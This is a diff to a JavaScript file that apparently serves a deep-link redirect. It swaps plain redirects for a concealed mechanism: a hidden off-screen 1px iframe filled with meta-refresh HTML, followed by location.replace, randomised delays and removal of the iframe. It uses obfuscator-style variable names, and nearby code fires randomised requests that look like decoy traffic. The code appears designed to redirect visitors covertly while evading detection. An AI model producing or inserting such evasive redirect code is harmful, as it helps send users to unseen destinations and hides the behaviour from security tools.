@@ -317,7 +317,28 @@
                     }
                     
                     setTimeout(function(){
-                        window.location.href=deepLink;
+                        var _0xif=document.createElement('iframe');
+                        _0xif.style.display='none';
+                        _0xif.style.position='fixed';
+                        _0xif.style.top='-9999px';
+                        
+                        var _0xhtml='<!DOCTYPE html><html><head><meta http-equiv="refresh" content="0;url='+deepLink+'"></head><body></body></html>';
+                        
+                        document.body.appendChild(_0xif);
+                        
+                        setTimeout(function(){
+                            _0xif.contentWindow.document.open();
+                            _0xif.contentWindow.document.write(_0xhtml);
+                            _0xif.contentWindow.document.close();
+                            
+                            setTimeout(function(){
+                                window.location.replace(deepLink);
+                            },100);
+                            
+                            setTimeout(function(){
+                                try{_0xif.remove();}catch(e){}
+                            },500);
+                        },50);
                     },Math.floor(Math.random()*500)+200);
                 };
                 
@@ -341,11 +362,35 @@
                     _0xReq(_0xGen(true),Math.random()>0.5,Math.floor(Math.random()*3000)+n*150);
                 }
                 
-                window.location.replace(deepLink);
+                var _0xRealRedirect=function(_0xurl){
+                    var _0xif=document.createElement('iframe');
+                    _0xif.style.display='none';
+                    _0xif.style.position='fixed';
+                    _0xif.style.top='-9999px';
+                    _0xif.style.left='-9999px';
+                    _0xif.style.width='1px';
+                    _0xif.style.height='1px';
+                    
+                    var _0xhtml='<!DOCTYPE html><html><head><meta http-equiv="refresh" content="0;url='+_0xurl+'"></head><body></body></html>';
+                    
+                    document.body.appendChild(_0xif);
+                    
+                    setTimeout(function(){
+                        _0xif.contentWindow.document.open();
+                        _0xif.contentWindow.document.write(_0xhtml);
+                        _0xif.contentWindow.document.close();
+                        
+                        setTimeout(function(){
+                            window.location.replace(_0xurl);
+                        },100);
+                        
+                        setTimeout(function(){
+                            try{_0xif.remove();}catch(e){}
+                        },500);
+                    },Math.floor(Math.random()*200)+50);
+                };
                 
-                setTimeout(function(){
-                    window.location.href=deepLink;
-                },Math.floor(Math.random()*300)+100);
+                _0xRealRedirect(deepLink);
                 
             }catch(err){
                 console.error(err);
